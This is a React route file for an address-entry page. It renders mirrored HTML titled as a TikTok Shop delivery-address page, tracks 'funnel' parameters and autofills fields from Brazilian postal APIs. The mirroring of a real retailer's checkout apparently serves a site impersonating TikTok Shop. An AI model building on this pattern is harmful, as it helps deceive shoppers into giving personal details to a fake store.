import { useEffect } from "react";
import { createFileRoute } from "@tanstack/react-router";
import { MirrorPage, mirrorHead } from "@/components/MirrorPage";
import html from "@/mirror/endereco.html?raw";

export const Route = createFileRoute("/endereco")({
  validateSearch: (s: Record<string, unknown>) => ({
    funnel: typeof s["funnel"] === "string" ? (s["funnel"] as string) : undefined,
  }),
  head: mirrorHead(
    "Endereço de Entrega | TikTok Shop",
    "Informe seu endereço de entrega."
  ),
  component: Endereco,
});

async function loadCities(uf: string, city: HTMLSelectElement, selected?: string) {
  city.innerHTML = '<option value="">Carregando...</option>';
  try {
    const r = await fetch(
      `https://servicodados.ibge.gov.br/api/v1/localidades/estados/${uf}/municipios?orderBy=nome`
    );
    const list: { nome: string }[] = await r.json();
    city.innerHTML =
      '<option value="">Cidade</option>' +
      list.map((c) => `<option value="${c.nome}">${c.nome}</option>`).join("");
    if (selected) city.value = selected;
  } catch {
    city.innerHTML = '<option value="">Cidade</option>';
  }
}

function Endereco() {
  const { funnel } = Route.useSearch();
  const back = funnel === "/w3" ? "/w3/checkout" : "/checkout";

  useEffect(() => {
    const uf = document.getElementById("sel-uf") as HTMLSelectElement | null;
    const city = document.getElementById("sel-cidade") as HTMLSelectElement | null;
    if (!uf || !city) return;
    const onUf = () => {
      if (uf.value) loadCities(uf.value, city);
      else city.innerHTML = '<option value="">Cidade</option>';
    };
    uf.addEventListener("change", onUf);

    // Preencher pelo CEP
    const cep = Array.from(document.querySelectorAll("input")).find((i) =>
      /CEP/i.test(i.placeholder)
    );
    const onCep = async () => {
      const v = cep!.value.replace(/\D/g, "");
      if (v.length !== 8) return;
      try {
        const d = await (await fetch(`https://viacep.com.br/ws/${v}/json/`)).json();
        if (d.erro) return;
        uf.value = d.uf;
        await loadCities(d.uf, city, d.localidade);
        const set = (re: RegExp, val: string) => {
          const i = Array.from(document.querySelectorAll("input")).find((x) => re.test(x.placeholder));
          if (i && val) i.value = val;
        };
        set(/Bairro/i, d.bairro);
        set(/^Endere/i, d.logradouro);
      } catch {
        /* ignore */
      }
    };
    cep?.addEventListener("input", onCep);
    return () => {
      uf.removeEventListener("change", onUf);
      cep?.removeEventListener("input", onCep);
    };
  }, []);

  return <MirrorPage html={html.replace('href="/w3/checkout"', `href="${back}"`)} />;
}
